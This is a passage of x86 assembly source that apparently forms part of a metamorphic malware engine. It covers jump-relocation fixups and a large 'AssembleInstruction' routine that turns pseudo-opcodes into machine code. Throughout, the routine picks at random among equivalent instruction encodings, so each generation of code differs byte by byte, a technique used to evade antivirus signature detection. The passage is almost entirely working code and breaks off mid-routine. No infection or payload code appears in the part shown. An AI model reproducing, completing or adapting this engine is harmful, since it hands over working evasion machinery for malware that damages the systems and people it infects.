                mov     eax, [esi+4]
                mov     eax, [eax]    ; Get the destiny of the jump
                mov     edx, edi      ; Get the final address of the jump in
                add     edx, 5        ;  EDX
                sub     eax, edx      ; Get the displacement
                mov     ebx, [edi]    ; Get the type of jump
                and     ebx, 0FFh
                cmp     ebx, 7Fh      ; Is it a short jump?
                jbe   @@Short
                cmp     ebx, 0EBh     ; " " " " "?
                jz    @@Short
                mov     [edi+1], eax  ; Set the displacement for long jumps,
     @@Next:    sub     ecx, 8        ; CALLs, etc.
                add     esi, 8        ; Check next
                or      ecx, ecx
                jnz   @@LoopReloc01
                ret
     @@Short:   add     eax, 3        ; Add 3 bytes of displacement (from a
                                      ; length of 5 to a length of 2)
                mov     [edi+1], al   ; Set the displacement
                jmp   @@Next          ; Next jump
AssembleCode    endp

;; This function assembles the instruction under the pointer in ESI to the
;; buffer in EDI.
AssembleInstruction proc
                mov     [esi+0Ch], edi ; Set the new address of assembled code
                mov     eax, [esi]
                and     eax, 0FFh       ; Get the pseudoopcode
                cmp     eax, 4Ch        ; Generic operation?
                ja    @@Assemble_Next00 ; If not, check next possibility
                mov     ebx, eax
                and     ebx, 0F8h
                and     eax, 7                   ; Get the type of operation
                or      eax, eax                 ; OP Reg,Imm?
                jz    @@Assemble_OPRegImm
                cmp     eax, 1                   ; OP Reg,Reg?
                jz    @@Assemble_OPRegReg
                cmp     eax, 2                   ; OP Reg,Mem?
                jz    @@Assemble_OPRegMem
                cmp     eax, 3                   ; OP Mem,Reg?
                jz    @@Assemble_OPMemReg
     @@Assemble_OPMemImm:                        ; OP Mem,Imm
                cmp     ebx, 38h                 ; If it's 38h or below, code
                jbe   @@Assemble_OPMemImm_Normal              ; it normally
                cmp     ebx, 40h                     ; MOV?
                jz    @@Assemble_MOVMemImm
     @@Assemble_TESTMemImm:                          ; TEST 
                xor     ebx, ebx        
                mov     eax, 0F7h                    ; Set the x86 opcode F7
                jmp   @@Assemble_OPMemImm_Normal_00
     @@Assemble_MOVMemImm:
                xor     ebx, ebx                     ; Set the x86 opcode C7
                mov     eax, 0C7h
                jmp   @@Assemble_OPMemImm_Normal_00
     @@Assemble_OPMemImm_Normal:
                mov     eax, [esi+7]                 ; Get the value
                cmp     eax, 7Fh                     ; Look if we can code it
                jbe   @@Assemble_OPMemImm_Normal_Byte ; as sign-extended
                cmp     eax, 0FFFFFF80h
                jae   @@Assemble_OPMemImm_Normal_Byte
     @@Assemble_OPMemImm_Normal_Dword:
                mov     eax, 81h             ; Normal opcode
     @@Assemble_OPMemImm_Normal_00:
                mov     [edi], eax           ; Set the opcode
                add     edi, 1             ; Make the memory address reference
                call    Asm_MakeMemoryAddress ; adding the value in EBX
                mov     eax, [esi+7]       ; Set the value to OP
                mov     [edi], eax
                add     edi, 4             ; Increase the EIP
                ret                        ; Return
     @@Assemble_OPMemImm_Normal_Byte:
                call    RandomBoolean
                or      eax, eax           ; Randomly choose if we code it
                jz    @@Assemble_OPMemImm_Normal_Dword ; as dword or sign-ext.
                mov     eax, 83h           ; Set the opcode 83h
                mov     [edi], eax
                add     edi, 1                ; Construct the memory address
                call    Asm_MakeMemoryAddress ; reference.
                mov     eax, [esi+7]       ; Get the immediate to set
                mov     [edi], eax
                add     edi, 1             ; Set only a byte
                ret                        ; Return


     @@Assemble_OPRegImm:
                cmp     ebx, 38h           ; If it's a normal OP, jump
                jbe   @@Assemble_OPRegImm_Normal
                cmp     ebx, 40h                     ; MOV?
                jz    @@Assemble_MOVRegImm
     @@Assemble_TESTRegImm:                          ; TEST
                mov     eax, [esi+1]                 ; Get the register
                and     eax, 7
                or      eax, eax              ; If Reg=EAX, we can code it
                jnz   @@Assemble_TESTRegImm_NotEAX   ; with its own opcode,
                call    RandomBoolean         ; so select randomly if we do it
                or      eax, eax
                jz    @@Assemble_TESTRegImm_NotEAX ; Jump if we don't do it
                mov     eax, 0A9h             ; Set TEST EAX,xxx
                jmp   @@Assemble_OPRegImm_OneByteOpcode
     @@Assemble_TESTRegImm_NotEAX:
                mov     eax, 0F7h             ; Set TEST Reg,xxx
                xor     ebx, ebx
                jmp   @@Assemble_OPRegImm_Normal_01

                                              ; MOV
     @@Assemble_MOVRegImm:
                call    RandomBoolean         ; Get a random TRUE or FALSE
                or      eax, eax              ; If FALSE, code it with a one
                jz    @@Assemble_MOVRegImm_OneByteOpcode ; byte opcode
                mov     eax, 0C7h             ; Get the two bytes opcode
                xor     ebx, ebx
                jmp   @@Assemble_OPRegImm_Normal_01
     @@Assemble_MOVRegImm_OneByteOpcode:
                mov     eax, [esi+1]          ; Get the register
                add     eax, 0B8h             ; Add B8h to it to get the MOV
                jmp   @@Assemble_OPRegImm_OneByteOpcode ; Jump to finish
     @@Assemble_OPRegImm_Normal:
                mov     eax, [esi+1]          ; Get the register
                and     eax, 7                ; Is it EAX?
                or      eax, eax
                jnz   @@Assemble_OPRegImm_Normal_00 ; If it isn't jump
                call    RandomBoolean         ; Select randomly to code a
                or      eax, eax              ; exclusive EAX opcode or not
                jz    @@Assemble_OPRegImm_Normal_00 ; If not, jump
                mov     eax, ebx              ; Add 5 to the generic opcode
                add     eax, 5                ; to get an OP EAX,xxx
     @@Assemble_OPRegImm_OneByteOpcode:
                mov     [edi], eax            ; Store the opcode
                mov     eax, [esi+7]
                mov     [edi+1], eax          ; Store the immediate
                add     edi, 5
                ret

     @@Assemble_OPRegImm_Normal_00:        ; 81h = normal OP Reg,Imm opcode
                mov     eax, 81h
     @@Assemble_OPRegImm_Normal_01:
                mov     [edi], eax                 ; Set the opcode
                mov     eax, [esi+1]               ; Set the "use register"
                and     eax, 7                     ; flag (the bits 7&6 on
                add     eax, 0C0h                  ; the second opcode set to
                add     eax, ebx                   ; 1)
                mov     [edi+1], eax
                mov     eax, [esi+7]        ; Get the immediate and set it
                mov     [edi+2], eax
                add     edi, 6              ; Add the length of the just coded
                ret                         ; instruction to the EIP

     @@Assemble_OPRegReg:                   ; Check if the operation is normal
                cmp     ebx, 38h
                jbe   @@Assemble_OPRegReg_Normal ; If it is, jump
                cmp     ebx, 40h                      ; MOV?
                jz    @@Assemble_MOVRegReg
     @@Assemble_TESTRegReg:                           ; TEST
                mov     ebx, 85h                  ; Opcode of TEST
     @@Assemble_TEST8RegReg_00:
                call    RandomBoolean   ; Select randomly if we use the normal
                or      eax, eax        ; opcode or the inversed one
                jz    @@Assemble_OPRegReg_NextFF
                jmp   @@Assemble_OPRegReg_Inversed_2

     @@Assemble_MOVRegReg:
                mov     ebx, 88h        ; MOV opcode
     @@Assemble_OPRegReg_Normal:
                add     ebx, 1          ; Set 32 bits
     @@Assemble_OP8RegReg_Normal:
                call    RandomBoolean   ; Select if we inverse it
                or      eax, eax
                jz    @@Assemble_OPRegReg_Inversed
     @@Assemble_OPRegReg_NextFF:
                mov     ecx, [esi+1]    ; Get in ECX the source
                mov     edx, [esi+7]    ; Get in EDX the destiny
                jmp   @@Assemble_OPRegReg_Next00 ; Jump to complete
     @@Assemble_OPRegReg_Inversed:
                add     ebx, 2          ; If inversed, add 2 to the opcode
     @@Assemble_OPRegReg_Inversed_2:
                mov     ecx, [esi+7]    ; Get in ECX the destiny
                mov     edx, [esi+1]    ; Get in EDX the source
     @@Assemble_OPRegReg_Next00:
                mov     [edi], ebx      ; Set the opcode
                mov     eax, ecx        ; Set ECX in bits 5,4,3 and EDX in
                shl     eax, 3          ;  bits 2,1,0
                add     eax, 0C0h       ; Activate bits 7&6 to use bits 2,1,0
                add     eax, edx        ;  as a register rather than as a
                mov     [edi+1], eax    ;  memory operand.
                add     edi, 2          ; Store it and increment the EIP
                ret

     @@Assemble_OPRegMem:
                cmp     ebx, 38h                   ; Normal operation?
                jbe   @@Assemble_OPRegMem_Normal   ; Then jump
                cmp     ebx, 40h                   ; MOV?
                jz    @@Assemble_MOVRegMem         ; Then jump
     @@Assemble_TESTRegMem:                      ; TEST
                mov     ebx, 85h                 ; Set the opcode
                jmp   @@Assemble_OPRegMem_Normal_00
     @@Assemble_MOVRegMem:
                mov     ebx, 88h     ; +3 = 8Bh
     @@Assemble_OPRegMem_Normal:
                add     ebx, 3
     @@Assemble_OPRegMem_Normal_00:
                mov     [edi], ebx         ; Set the opcode
                add     edi, 1
                mov     ebx, [esi+7]       ; Get the register
                and     ebx, 7             ; Mix it with the memory address
                shl     ebx, 3             ;  opcode data
                call    Asm_MakeMemoryAddress  ; Construct the mem. reference
                ret

     @@Assemble_OPMemReg:
                cmp     ebx, 38h           ; Generic operation?
                jbe   @@Assemble_OPMemReg_Normal
                cmp     ebx, 40h            ; MOV?
                jnz   @@Assemble_TESTRegMem ; Jump if it's TEST
     @@Assemble_MOVMemReg:
                mov     ebx, 88h           ; Set MOV opcode (+1 = 32 bits op.)
                ;jmp   @@Assemble_OPRegMem_Normal_00
     @@Assemble_OPMemReg_Normal:
                add     ebx, 1
                jmp   @@Assemble_OPRegMem_Normal_00

;;;-------------------------------------------------

   ; Assembly of INC/DEC Reg
     @@Assemble_INCDECReg:
                call    RandomBoolean      ; Select one codification or other
                or      eax, eax           ; If EAX=0, use INC/DEC Mem opcode
                jz    @@Assemble_INCDECReg_2   ; forced to register usage
       @@Assemble_INCDECReg_1:
                mov     eax, [esi+7]       ; Get the operation (0=INC, 8=DEC)
                add     eax, 40h           ; Make it 40h/48h (x86 opcode)
       @@Assemble_INCDECReg_Common:
                add     eax, [esi+1]       ; Bind the register to the opcode
                mov     [edi], eax         ; and write it
                add     edi, 1
                ret
       @@Assemble_INCDECReg_2:
                mov     eax, 0FFh         ; INC/DEC/etc. Mem32 extended opcode
       @@Assemble_INCDECReg_2_8b:
                mov     [edi], eax        ; Write it
                add     edi, 1
                mov     eax, [esi+7]      ; Get the operation (0 or 8)
                add     eax, 0C0h         ; Force it to use registers
                jmp   @@Assemble_INCDECReg_Common ; Jump to complete it
     @@Assemble_INCDECReg_8b:
                mov     eax, 0FEh          ; INC/DEC/PUSH/etc. Mem8 opcode
                jmp   @@Assemble_INCDECReg_2_8b

     @@Assemble_INCDECMem:
                mov     eax, 0FFh    ; FF = Extended opcode for INC, DEC, etc.
     @@Assemble_INCDECMem_2_8b:      ; (32 bits)
                mov     [edi], eax    ; Set the opcode
                add     edi, 1
                mov     ebx, [esi+7]  ; Get the operation and bind it to the
                call    Asm_MakeMemoryAddress ; memory operand codification
                ret                           ; (in 2nd opcode)
     @@Assemble_INCDECMem_8b:
                mov     eax, 0FEh    ; INC/DEC/PUSH/etc. opcode for 8 bits
                jmp   @@Assemble_INCDECMem_2_8b


     @@Assemble_Next00:
                cmp     eax, 4Eh       ; INC/DEC Reg32 pseudoopcode?
                jz    @@Assemble_INCDECReg
                cmp     eax, 4Eh+80h   ; INC/DEC Reg8 pseudoopcode?
                jz    @@Assemble_INCDECReg_8b
                cmp     eax, 4Fh       ; INC/DEC Mem32 pseudoopcode?
                jz    @@Assemble_INCDECMem
                cmp     eax, 4Fh+80h   ; INC/DEC Mem8 pseudoopcode?
                jz    @@Assemble_INCDECMem_8b


     @@Assemble_Next00_:               ; Generic 8 bits opcodes 
                cmp     eax, 00h+80h
                jb    @@Assemble_Next01
                cmp     eax, 4Ch+80h
                ja    @@Assemble_Next01
                mov     ebx, eax       ; Get the type of operation
                and     ebx, 78h
                and     eax, 7
                or      eax, eax              ; OP Reg,Imm?
                jz    @@Assemble_OP8RegImm
                cmp     eax, 1                ; OP Reg,Reg?
                jz    @@Assemble_OP8RegReg
                cmp     eax, 2                ; OP Reg,Mem?
                jz    @@Assemble_OP8RegMem
                cmp     eax, 3                ; OP Mem,Reg?
                jz    @@Assemble_OP8MemReg
     @@Assemble_OP8MemImm:                    ; OP Mem,Imm
                cmp     ebx, 38h
                jbe   @@Assemble_OP8MemImm_Normal ; Jump if it's not MOV/TEST
                cmp     ebx, 40h                  ; MOV?
                jz    @@Assemble_MOV8MemImm    
     @@Assemble_TEST8MemImm:                  ; TEST
                xor     ebx, ebx
                mov     eax, 0F6h             ; x86 TEST Mem8,Imm opcode
                call  @@Assemble_OPMemImm_Normal_00  ; Assemble it
                sub     edi, 3                ; Subtract 3 because it added
                ret                           ; DWORD length, not byte length
     @@Assemble_MOV8MemImm:
                xor     ebx, ebx           ; The same as with TEST, but with
                mov     eax, 0C6h          ; the opcode 0C6h
                call  @@Assemble_OPMemImm_Normal_00
                sub     edi, 3
                ret
     @@Assemble_OP8MemImm_Normal:
                call    Random             ; Select randomly 80h or 82h (for
                and     eax, 2             ; 8 bits both are the same)
                add     eax, 80h
                call  @@Assemble_OPMemImm_Normal_00
                sub     edi, 3
                ret

     @@Assemble_OP8RegImm:
                cmp     ebx, 38h           ; Jump if not MOV/TEST
                jbe   @@Assemble_OP8RegImm_Normal
                cmp     ebx, 40h                 ; MOV?
                jz    @@Assemble_MOV8RegImm
     @@Assemble_TEST8RegImm:                     ; Let's code TEST
                mov     eax, [esi+1]             ; Get the register in EAX
                and     eax, 7
                or      eax, eax                 ; If Reg == AL, we can use
                jnz   @@Assemble_TEST8RegImm_NotEAX ; the specific opcode for
                call    RandomBoolean               ; AL register: A8h
                or      eax, eax
                jz    @@Assemble_TEST8RegImm_NotEAX
                mov     eax, 0A8h
                call  @@Assemble_OPRegImm_OneByteOpcode
                sub     edi, 3
                ret
     @@Assemble_TEST8RegImm_NotEAX:              ; If it's not AL, then we
                mov     eax, 0F6h                ; use the normal opcode: F6
                xor     ebx, ebx                 ; (the same as with TEST Reg,
                call  @@Assemble_OPRegImm_Normal_01   ; Mem but with the
                sub     edi, 3                   ; register usage activated.
                ret
     @@Assemble_MOV8RegImm:
                call    RandomBoolean            ; If MOV, we can use the
                or      eax, eax                 ; normal, one-byte opcode
                jz    @@Assemble_MOV8RegImm_OneByteOpcode ; or the opcode used
                mov     eax, 0C6h                ; for MOV Mem,Imm but with
                xor     ebx, ebx                 ; register usage active.
                call  @@Assemble_OPRegImm_Normal_01
                sub     edi, 3
                ret
     @@Assemble_MOV8RegImm_OneByteOpcode:
                mov     eax, [esi+1]
                add     eax, 0B0h                ; MOV Reg8,Imm
                call  @@Assemble_OPRegImm_OneByteOpcode
                sub     edi, 3
                ret
     @@Assemble_OP8RegImm_Normal:
                mov     eax, [esi+1]             ; If the register is AL, we
                and     eax, 7                   ; can use the AL exclusive
                or      eax, eax                 ; opcode
                jnz   @@Assemble_OP8RegImm_Normal_00
                call    RandomBoolean            ; Do we use it?
                or      eax, eax
                jz    @@Assemble_OP8RegImm_Normal_00 ; If no, jump
                mov     eax, ebx                 ; Get the opcode
                add     eax, 4                   ; Add 4 to the opcode to make
                call  @@Assemble_OPRegImm_OneByteOpcode ; it "OP AL,x"
                sub     edi, 3
                ret
     @@Assemble_OP8RegImm_Normal_00:
                call    Random            ; The same as with OP Reg,Imm: both
                and     eax, 2            ; 80h and 82h opcodes are valid for
                add     eax, 80h          ; these instructions.
                call  @@Assemble_OPRegImm_Normal_01
                sub     edi, 3
                ret

     @@Assemble_OP8RegReg:
                cmp     ebx, 38h          ; Jump if it's not MOV/TEST
                jbe   @@Assemble_OP8RegReg_Normal
                cmp     ebx, 40h
                jz    @@Assemble_MOV8RegReg
     @@Assemble_TEST8RegReg:              ; TEST?
                mov     ebx, 84h          ; Then use TEST opcode
                jmp   @@Assemble_TEST8RegReg_00
     @@Assemble_MOV8RegReg:
                mov     ebx, 88h          ; Use MOV opcode
                jmp   @@Assemble_OP8RegReg_Normal


     @@Assemble_OP8RegMem:
                cmp     ebx, 38h          ; As always...
                jbe   @@Assemble_OP8RegMem_Normal
                cmp     ebx, 40h
                jz    @@Assemble_MOV8RegMem
     @@Assemble_TEST8RegMem:
                mov     ebx, 84h          ; TEST opcode
                jmp   @@Assemble_OPRegMem_Normal_00
     @@Assemble_MOV8RegMem:
                mov     ebx, 88h          ; MOV opcode
     @@Assemble_OP8RegMem_Normal:
                add     ebx, 2
                jmp   @@Assemble_OPRegMem_Normal_00


     @@Assemble_OP8MemReg:
                cmp     ebx, 38h          ; Again...
                jbe   @@Assemble_OPRegMem_Normal_00
                cmp     ebx, 40h          ; TEST Reg,Mem = TEST Mem,Reg
                jnz   @@Assemble_TEST8RegMem
     @@Assemble_MOV8MemReg:
                mov     ebx, 88h          ; MOV opcode
                jmp   @@Assemble_OPRegMem_Normal_00


;;;-------------------------------------------------
     @@Assemble_Next01:
                cmp     eax, 50h          ; PUSH pseudoopcode?
                jnz   @@Assemble_Next02
                call    RandomBoolean     ; Select if we use the specific
                or      eax, eax          ; register opcode or the memory
                jz    @@Assemble_PUSHReg_2 ; opcode set up to use registers
     @@Assemble_PUSHReg_1:
                mov     eax, [esi]        ; Get the opcode (50h or 58h)
                and     eax, 0FFh
                mov     ebx, [esi+1]      ; Bind the register
                add     eax, ebx
     @@Assemble_StoreByte:
                mov     [edi], eax        ; Store the one-byte opcode
                add     edi, 1
                ret
     @@Assemble_PUSHReg_2:
                mov     eax, 0FFh         ; Two bytes opcode for PUSH Reg is
                mov     [edi], eax        ; FF,(F0 + Reg)
                mov     eax, [esi+1]
                add     eax, 0F0h
                mov     [edi+1], eax
                add     edi, 2
                ret

     @@Assemble_Next02:
                cmp     eax, 58h          ; POP Reg?
                jnz   @@Assemble_Next03
                call    RandomBoolean     ; Select one-byte or two-bytes opc.
                or      eax, eax
                jz    @@Assemble_PUSHReg_1  ; POP Reg (one byte opcode)
     @@Assemble_POPReg_2:
                mov     eax, 8Fh          ; Two bytes POP Reg opcode is
                mov     [edi], eax        ; 8F,(C0 + Reg)
                mov     eax, [esi+1]
                add     eax, 0C0h
                mov     [edi+1], eax
                add     edi, 2
                ret

     @@Assemble_Next03:
                cmp     eax, 51h          ; PUSH Mem?
                jnz   @@Assemble_Next04
                mov     eax, 0FFh         ; Opcode is FF,(30+mem codification)
                mov     ebx, 30h
     @@Assemble_POPMem:
                mov     [edi], eax        ; Set opcode (FF or 8F)
                add     edi, 1
                call    Asm_MakeMemoryAddress ; Code the memory reference
                ret

     @@Assemble_Next04:
                cmp     eax, 59h          ; POP Mem?
                jnz   @@Assemble_Next05
                mov     eax, 8Fh          ; Opcode is 8F,(00+mem codification)
                xor     ebx, ebx
                jmp   @@Assemble_POPMem


     @@Assemble_Next05:
                cmp     eax, 68h          ; PUSH Imm?
                jnz   @@Assemble_Next06
                mov     [edi], eax        ; Set opcode 68h
                mov     eax, [esi+7]      ; Get the Imm to push
                cmp     eax, 7Fh
                jbe   @@Assemble_PUSHImm_Byte  ; Check if we can use the
                cmp     eax, 0FFFFFF80h        ; PUSH signed-Imm opcode
                jae   @@Assemble_PUSHImm_Byte
     @@Assemble_PUSHImm_Dword:
                mov     [edi+1], eax     ; Store the Imm
                add     edi, 5           ; Increase the storage EIP
                ret
     @@Assemble_PUSHImm_Byte:
                push    eax              ; Select randomly if we use a sign
                call    RandomBoolean    ; extended byte Imm or a dword Imm
                mov     ebx, eax
                pop     eax
                or      ebx, ebx
                jz    @@Assemble_PUSHImm_Dword
                mov     ebx, 6Ah         ; Insert the opcode
                mov     [edi], ebx
                mov     [edi+1], eax     ; Put the value
                add     edi, 2
                ret

     @@Assemble_Next06:
                cmp     eax, 0E0h        ; NOT?
                jnz   @@Assemble_Next07
                mov     ebx, 0D0h        ; EBX = NOT operation under F7 opcode
     @@Assemble_NEG32Reg:
                mov     eax, 0F7h        ; F7 = opcode of NOT/NEG and etc.
     @@Assemble_Nxx8Reg:
                mov     [edi], eax       ; Set the first opcode
                mov     eax, [esi+1]
                add     eax, ebx         ; Bind the register to the 2nd opcd.
                mov     [edi+1], eax     ; Store it
                add     edi, 2
                ret

     @@Assemble_Next07:
                cmp     eax, 0E4h        ; NEG Reg?
                jnz   @@Assemble_Next08
                mov     ebx, 0D8h        ; Set NEG Reg operation on 2nd opc.
                jmp   @@Assemble_NEG32Reg

     @@Assemble_Next08:
                cmp     eax, 0E2h        ; NOT Reg8?
                jnz   @@Assemble_Next09
                mov     ebx, 0D0h        ; Set NOT Reg operation on 2nd opcode
     @@Assemble_NEG8Reg:
                mov     eax, 0F6h        ; Same as F7 but with 8 bits operands
                jmp   @@Assemble_Nxx8Reg

     @@Assemble_Next09:
                cmp     eax, 0E6h        ; NEG Reg8?
                jnz   @@Assemble_Next10
                mov     ebx, 0D8h        ; Set NEG Reg op. on 2nd opcode
                jmp   @@Assemble_NEG8Reg


     @@Assemble_Next10:
                cmp     eax, 0E1h        ; NOT Mem?
                jnz   @@Assemble_Next11
                mov     ebx, 10h         ; Then set NOT Mem op. on 2nd opcode
     @@Assemble_NEG32Mem:
                mov     eax, 0F7h        ; Set NOT/NEG/etc. opcode (32 bits)
     @@Assemble_Nxx8Mem:
                mov     [edi], eax       ; Set the first opcode
                add     edi, 1
                call    Asm_MakeMemoryAddress ; Construct the memory reference
                ret                       ; (mixing it with the value in EBX)

     @@Assemble_Next11:
                cmp     eax, 0E5h        ; NEG Mem?
                jnz   @@Assemble_Next12
                mov     ebx, 18h         ; Then set NEG Mem on 2nd opcode and
                jmp   @@Assemble_NEG32Mem ; jump to construct the operation

     @@Assemble_Next12:
                cmp     eax, 0E3h        ; NOT Mem8?
                jnz   @@Assemble_Next13
                mov     ebx, 10h         ; Set NOT Mem8 op.
     @@Assemble_NEG8Mem:
                mov     eax, 0F6h        ; Use 8 bits opcode for NOT/NEG
                jmp   @@Assemble_Nxx8Mem

     @@Assemble_Next13:
                cmp     eax, 0E7h        ; NEG Mem8?
                jnz   @@Assemble_Next14
                mov     ebx, 18h         ; Then set NEG Mem8 op. on 2nd opc.
                jmp   @@Assemble_NEG8Mem ;  and jump to construct the instrc.

     @@Assemble_Next14:
                cmp     eax, 0EAh        ; CALL Mem?
                jnz   @@Assemble_Next15
                mov     eax, 0FFh        ; Set the opcode: FF,(10+mem. ref)
                mov     ebx, 10h
                jmp   @@Assemble_Nxx8Mem ; Code mem address

     @@Assemble_Next15:
                cmp     eax, 0EBh        ; JMP Mem?
                jnz   @@Assemble_Next16
                mov     eax, 0FFh        ; Then set the opcode:
                mov     ebx, 20h         ;  FF,(20+mem ref.)
                jmp   @@Assemble_Nxx8Mem

     @@Assemble_Next16:
                cmp     eax, 0ECh        ; CALL Reg?
                jnz   @@Assemble_Next17
                mov     eax, 0FFh        ; Then use the same opcode than
                mov     ebx, 0D0h        ; CALL Mem but ORing the 2nd opcode
                jmp   @@Assemble_Nxx8Reg ; with C0 (bits 7&6 active), so we
                                        ; tell the processor to use bits 2,1,0
                                        ; as a direct register rather than as
                                        ; a memory address codification
     @@Assemble_Next17:
                cmp     eax, 0EDh       ; JMP Reg?
                jnz   @@Assemble_Next18
                mov     eax, 0FFh       ; Then, the same as above but with
                mov     ebx, 0E0h       ; 2nd opcode = 20h OR C0h
                jmp   @@Assemble_Nxx8Reg


     @@Assemble_Next18:
                cmp     eax, 0F0h       ; SHIFT Reg operation?
                jnz   @@Assemble_Next19
                mov     eax, [esi+7]    ; Get the value
                and     eax, 0FFh
                cmp     eax, 1          ; If it's 1, we can use SHIFT,1 ops.
                jz    @@Assemble_SHIFT_1
     @@Assemble_SHIFT_2:
                mov     ecx, 0C1h       ; Use opcode C1 and a mask of E0 to
                mov     edx, 0E0h       ; get random upper bits in the shift
     @@Assemble_SHIFT8_1_00:            ; value
                call  @@Assemble_SHIFT_x ; Set the opcode and the operation
                mov     ebx, [esi+7]    ; Get the value
                and     ebx, 0FFh
                call    Random          ; Get a random number
                and     eax, edx        ; Mask it with EDX (00 or E0)
                add     eax, ebx        ; Add the value to shift
                mov     [edi], eax      ; Set the Imm in the instruction
                add     edi, 1
                ret                     ; Return
     @@Assemble_SHIFT_1:
                call    RandomBoolean   ; Select randomly if we use the ,1
                or      eax, eax        ; opcode or the ,x one
                jz    @@Assemble_SHIFT_2
                mov     ecx, 0D1h       ; Opcode D1: SHIFT Mem/Reg,1
     @@Assemble_SHIFT_x:
                mov     [edi], ecx      ; Set the opcode in ECX
                add     edi, 1
                mov     ebx, [esi+8]    ; Get the operation
                and     ebx, 8          ; Reduce it to SHIFT LEFT/RIGHT
                add     ebx, 0C0h       ; Select randomly SHL/ROL or SHR/ROR.
                call    Random          ; We have prepared the shifting instr.
                and     eax, 20h        ; in the engine to support either SHx
                add     ebx, eax        ; or ROx indifferently
                mov     eax, [esi+1]    ; Get the register
                and     eax, 7
                add     eax, ebx        ; Set it into the opcode
                mov     [edi], eax      ; Insert the opcode
                add     edi, 1
                ret

     @@Assemble_Next19:
                cmp     eax, 0F2h       ; SHIFT Reg8?
                jnz   @@Assemble_Next20
                mov     eax, [esi+7]    ; Get the value
                and     eax, 0FFh       ; Check if it's 1 to see if we can
                cmp     eax, 1          ; use the ,1 opcode
                jz    @@Assemble_SHIFT8_1
     @@Assemble_SHIFT8_2:
                mov     ecx, 0C0h       ; Set 1st opcode as C0
                xor     edx, edx        ; Mask with 00 the upper bits of the
                jmp   @@Assemble_SHIFT8_1_00 ; shifting value
     @@Assemble_SHIFT8_1:
                call    RandomBoolean   ; Select randomly the using of ,1/,x
                or      eax, eax
                jz    @@Assemble_SHIFT8_2
                mov     ecx, 0D0h       ; Set 1st opcode as D0
                jmp   @@Assemble_SHIFT_x ; Jump to complete the opcode


     @@Assemble_Next20:
                cmp     eax, 0F1h       ; SHIFT Mem?
                jnz   @@Assemble_Next21
                mov     eax, [esi+7]
                and     eax, 0FFh       ; Check the value to look if we can
                cmp     eax, 1          ; use ,1 or ,x
                jz    @@Assemble_SHIFTMem_1
     @@Assemble_SHIFTMem_2:
                mov     ecx, 0C1h       ; Opcode C1, mask E0
                mov     edx, 0E0h
     @@Assemble_SHIFT8Mem_1_00:
                push    edx             ; Make the opcode
                call  @@Assemble_SHIFTMem_x
                pop     edx             ; Set the value with random upper
                mov     ebx, [esi+7]    ; bits for 32 bits shiftings (mask of
                and     ebx, 0FFh       ; E0) or upper bits to 0 if 8 bits
                call    Random          ; mask of 00)
                and     eax, edx
                add     eax, ebx
                mov     [edi], eax
                add     edi, 1
                ret
     @@Assemble_SHIFTMem_1:
                call    Random          ; Do we use the ,x opcode?
                or      eax, eax
                jz    @@Assemble_SHIFTMem_2 ; Jump if we decided to use it!
                mov     ecx, 0D1h       ; Set D1 opcode
     @@Assemble_SHIFTMem_x:
                mov     [edi], ecx      ; Set the opcode
                add     edi, 1
                mov     ebx, [esi+8]    ; Get the direction of the shift
                and     ebx, 8
                call    Random
                and     eax, 20h        ; Select SHx or ROx
                add     ebx, eax        ; Set it in EBX to mix it with the
                call    Asm_MakeMemoryAddress ; 2nd opcode and code the
                ret                           ; memory address in the 2nd opc.

     @@Assemble_Next21:
                cmp     eax, 0F3h       ; SHIFT Mem8?
                jnz   @@Assemble_Next22
                mov     eax, [esi+7]    ; Just the same as above but with
                and     eax, 0FFh       ; opcodes C0 and D0 instead of C1 and
                cmp     eax, 1          ; D1. And, of course, a mask of 00,
                jz    @@Assemble_SHIFT8Mem_1 ; because the 8 bits shiftings
     @@Assemble_SHIFT8Mem_2:                 ; don't ignore the upper bits
                mov     ecx, 0C0h            ; as the 32 bits instructions do
                xor     edx, edx             ; (don't ask me why)
                jmp   @@Assemble_SHIFT8Mem_1_00
     @@Assemble_SHIFT8Mem_1:
                call    RandomBoolean
                or      eax, eax
                jz    @@Assemble_SHIFT8Mem_2
                mov     ecx, 0D0h
                jmp   @@Assemble_SHIFTMem_x

     @@Assemble_Next22:
                cmp     eax, 0FCh       ; LEA Reg,[Mem]?
                jnz   @@Assemble_Next23
                mov     eax, 8Dh        ; Then, insert a LEA opcode (8D), set
                mov     [edi], eax      ; in bits 5,4,3 the destiny register
                add     edi, 1          ; and code the memory address.
                mov     ebx, [esi+7]
                and     ebx, 7
                shl     ebx, 3
                call    Asm_MakeMemoryAddress
                ret

     @@Assemble_Next23:
                cmp     eax, 0FDh       ; Direct byte insertion?
                jnz   @@Assemble_Next24
                mov     eax, [esi+1]    ; Then, insert it
                jmp   @@Assemble_StoreByte

     @@Assemble_Next24:
                cmp     eax, 0FEh       ; RET?
                jnz   @@Assemble_Next25
                mov     eax, 0C3h       ; Then, insert the RET opcode
                jmp   @@Assemble_StoreByte

     @@Assemble_Next25:
                cmp     eax, 0FFh       ; NOP?
                jnz   @@Assemble_Next26
                mov     eax, 90h        ; Then, insert the NOP opcode
                jmp   @@Assemble_StoreByte

     @@Assemble_Next26:
                cmp     eax, 70h        ; Jcc?
                jb    @@Assemble_Next27
                cmp     eax, 7Fh
                ja    @@Assemble_Next27
                mov     eax, [esi+7]    ; Get the type of jump: normal or
                or      eax, eax        ;  inversed (JNZ/JMP rather than JZ)
                jz    @@Assemble_Jump_Normal
                mov     eax, [esi]      ; Inverse the condition
                xor     eax, 1
                mov     [edi], eax      ; Store the opcode
                add     edi, 1          ; Increase the EIP
                push    edi             ; Save the EIP
                add     edi, 1
                mov     eax, 0E9h       ; Make a JMP to the label
                mov     [esi], al
                call  @@Assemble_Jump_Normal
                pop     ebx             ; Get the old EIP in EBX
                mov     eax, edi        ; Get the current EIP
                sub     eax, ebx        ; Calculate the displacement in EAX
                sub     eax, 1          ; Add 1 to overpass the Jcc itself
                mov     [ebx], al       ; Store the displacement
                ret


     @@Assemble_Next27:
                cmp     eax, 0F8h       ; MOVZX Reg,[Mem8]?
                jnz   @@Assemble_Next28
                mov     eax, 0B60Fh     ; Set the MOVZX opcode
                mov     [edi], eax
                add     edi, 2
                mov     ebx, [esi+7]    ; Get the register and bind it to the
                and     ebx, 7          ; memory address codification in the
                shl     ebx, 3          ; 2nd opcode
                call    Asm_MakeMemoryAddress
                ret

     @@Assemble_Next28:
               ; cmp     eax, 0E8h       ; Here only can be opcodes E8 or E9
               ; jmp   @@Assemble_Jump_Normal


     @@Assemble_Jump_Normal:
                mov     ebx, [esi+1]    ; Get the label
                mov     eax, [ebx+4]    ; Get the pointed address
